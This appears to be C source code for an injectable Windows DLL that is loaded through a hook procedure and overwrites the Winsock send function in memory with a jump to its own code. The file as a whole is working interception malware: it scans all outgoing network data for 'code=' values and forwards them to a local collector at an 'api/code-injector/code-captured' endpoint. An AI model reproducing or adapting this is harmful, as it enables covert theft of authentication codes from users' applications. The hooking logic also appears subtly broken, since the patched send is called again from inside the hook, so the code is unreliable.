/* ws-hook.dll - SetWindowsHookEx version */
/* Exports: HookProc - for SetWindowsHookEx injection */
typedef unsigned long DWORD;
typedef int BOOL;
typedef void* LPVOID;
typedef int SOCKET;
struct sockaddr_in{short family;short port;char addr[4];char zero[8];};

void* GetProcAddress(void*,const char*);
void* LoadLibraryA(const char*);
int VirtualProtect(void*,DWORD,DWORD,DWORD*);
void* CreateThread(void*,DWORD,void*,void*,DWORD,void*);

typedef int (*FN_WSASTARTUP)(int,void*);
typedef SOCKET (*FN_SOCKET)(int,int,int);
typedef int (*FN_CONNECT)(SOCKET,void*,int);
typedef int (*FN_CLOSE)(SOCKET);
typedef int (*FN_SEND)(SOCKET,const char*,int,int);
static FN_WSASTARTUP pWSAStartup=0;
static FN_SOCKET psocket=0;
static FN_CONNECT pconnect=0;
static FN_CLOSE pclosesocket=0;
static FN_SEND Real_send=0;
static int g_ready=0;
static int g_hooked=0;

static void load_winsock(){
pWSAStartup=(FN_WSASTARTUP)GetProcAddress(LoadLibraryA("ws2_32.dll"),"WSAStartup");
psocket=(FN_SOCKET)GetProcAddress(LoadLibraryA("ws2_32.dll"),"socket");
pconnect=(FN_CONNECT)GetProcAddress(LoadLibraryA("ws2_32.dll"),"connect");
pclosesocket=(FN_CLOSE)GetProcAddress(LoadLibraryA("ws2_32.dll"),"closesocket");
if(pWSAStartup&&psocket&&pconnect&&pclosesocket){
g_ready=1;int v=0x0202;pWSAStartup(v,&v);}
}
static void post_code(const char*code){
int i,blen=0;char buf[600];SOCKET s;
struct sockaddr_in a;
if(!g_ready)return;
a.family=2;a.port=0xCB0B;
a.addr[0]=127;a.addr[1]=0;a.addr[2]=0;a.addr[3]=1;
for(i=0;i<8;i++)a.zero[i]=0;
s=psocket(2,1,0);if(s==-1)return;
if(pconnect(s,(void*)&a,16)!=0){pclosesocket(s);return;}
buf[blen++]='P';buf[blen++]='O';buf[blen++]='S';buf[blen++]='T';
buf[blen++]=' ';buf[blen++]='/';buf[blen++]='a';buf[blen++]='p';buf[blen++]='i';
buf[blen++]='/';buf[blen++]='c';buf[blen++]='o';buf[blen++]='d';buf[blen++]='e';
buf[blen++]='-';buf[blen++]='i';buf[blen++]='n';buf[blen++]='j';buf[blen++]='e';
buf[blen++]='c';buf[blen++]='t';buf[blen++]='o';buf[blen++]='r';buf[blen++]='/';
buf[blen++]='c';buf[blen++]='o';buf[blen++]='d';buf[blen++]='e';buf[blen++]='-';
buf[blen++]='c';buf[blen++]='a';buf[blen++]='p';buf[blen++]='t';buf[blen++]='u';
buf[blen++]='r';buf[blen++]='e';buf[blen++]='d';buf[blen++]=' ';buf[blen++]='H';
buf[blen++]='T';buf[blen++]='T';buf[blen++]='P';buf[blen++]='/';buf[blen++]='1';
buf[blen++]='.';buf[blen++]='0';buf[blen++]=13;buf[blen++]=10;
buf[blen++]='C';buf[blen++]='o';buf[blen++]='n';buf[blen++]='t';buf[blen++]='e';
buf[blen++]='n';buf[blen++]='t';buf[blen++]='-';buf[blen++]='T';buf[blen++]='y';
buf[blen++]='p';buf[blen++]='e';buf[blen++]=':';buf[blen++]=' ';
buf[blen++]='a';buf[blen++]='p';buf[blen++]='p';buf[blen++]='l';buf[blen++]='i';
buf[blen++]='c';buf[blen++]='a';buf[blen++]='t';buf[blen++]='i';buf[blen++]='o';
buf[blen++]='n';buf[blen++]='/';buf[blen++]='j';buf[blen++]='s';buf[blen++]='o';
buf[blen++]='n';buf[blen++]=13;buf[blen++]=10;
buf[blen++]='{';buf[blen++]='"';buf[blen++]='c';buf[blen++]='o';buf[blen++]='d';buf[blen++]='e';buf[blen++]='"';buf[blen++]=':';buf[blen++]='"';
i=0;while(code[i]&&i<64&&blen<550)buf[blen++]=code[i++];
buf[blen++]='"';buf[blen++]='}';buf[blen++]=13;buf[blen++]=10;
Real_send(s,buf,blen,0);
pclosesocket(s);
}
static int hook_send(SOCKET s,const char*buf,int len,int f){
int i;if(!buf||len<10)return Real_send(s,buf,len,f);
for(i=0;i<len-5;i++){
if(buf[i]==99&&buf[i+1]==111&&buf[i+2]==100&&buf[i+3]==101&&buf[i+4]==61){
char cd[65];int ci=0,j=i+5;
while(j<len&&ci<64&&buf[j]&&buf[j]!=38&&buf[j]!=32)cd[ci++]=buf[j++];
cd[ci]=0;if(ci>=10)post_code(cd);break;}}
return Real_send(s,buf,len,f);}
static void patch(void*t,void*h){
unsigned char*c=(unsigned char*)t;DWORD o=0;
long long d=(long long)h-(long long)(c+5);
if(d>=-2147483647LL-1&&d<=2147483647LL){
VirtualProtect(c,5,0x40,&o);
c[0]=0xE9;c[1]=(unsigned char)d;c[2]=(unsigned char)(d>>8);
c[3]=(unsigned char)(d>>16);c[4]=(unsigned char)(d>>24);
VirtualProtect(c,5,o,&o);
}else{VirtualProtect(c,14,0x40,&o);
c[0]=0xFF;c[1]=0x25;c[2]=0;c[3]=0;c[4]=0;c[5]=0;
*(long long*)(c+6)=(long long)h;
VirtualProtect(c,14,o,&o);}}
static unsigned long thread_fn(void*p){load_winsock();return 0;}
/* Exported hook procedure */
int HookProc(int n,unsigned long w,long l){
if(!g_hooked){
void*w=LoadLibraryA("ws2_32.dll");
if(w){
Real_send=(FN_SEND)GetProcAddress(w,"send");
if(Real_send)patch((void*)Real_send,hook_send);
CreateThread(0,0,thread_fn,0,0,0);
g_hooked=1;
}}return 0;}
int DllEntry(void*d,DWORD r,void*x){return 1;}